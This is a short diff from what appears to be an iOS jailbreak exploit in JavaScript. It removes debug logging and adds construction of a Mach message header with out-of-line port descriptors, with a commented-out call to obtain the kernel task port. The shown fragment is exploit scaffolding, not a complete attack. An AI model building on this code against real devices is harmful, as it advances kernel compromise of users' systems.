@@ -55,8 +55,6 @@ function main() {
 	sym_cache["JSContextGetGlobalObject"] = JSContextGetGlobalObject + dyld_shc_slide;
 	prep_shit();
 
-	p0laris_log("%s", prim_hexdump(u32xn_to_u8xn([0x41424344, 0x45464748, 0x494a4b4c, 0x4d4e4f50])));
-
 	var init_port_set = new mach_msg_ool_ports_descriptor_t(4);
 	var addy = init_port_set.addy;
 	var init_port_set_obj = init_port_set.deref();
@@ -65,7 +63,6 @@ function main() {
 	init_port_set_obj.disposition = 19;
 	init_port_set_obj.deallocate = false;
 	init_port_set_obj.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-	p0laris_log("%x", addy);
 	init_port_set.write(init_port_set_obj, 0);
 	init_port_set.write(init_port_set_obj, 1);
 	init_port_set.write(init_port_set_obj, 2);
@@ -74,6 +71,16 @@ function main() {
 							   JSON.stringify(init_port_set.deref(1)),
 							   JSON.stringify(init_port_set.deref(2)),
 							   JSON.stringify(init_port_set.deref(3)));
+	
+	var Head = new mach_msg_header_t();
+	var addy = Head.addy;
+	var Head_obj = Head.deref();
+	Head_obj.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+	Head_obj.msgh_remote_port = 0x41424344;
+	Head_obj.msgh_local_port = 0x45464748;
+	Head_obj.msgh_id = 1337;
+	Head.write(Head_obj);
+	p0laris_log("%s", JSON.stringify(Head.deref()));
 
 //	var tfp0 = get_kernel_task();
 
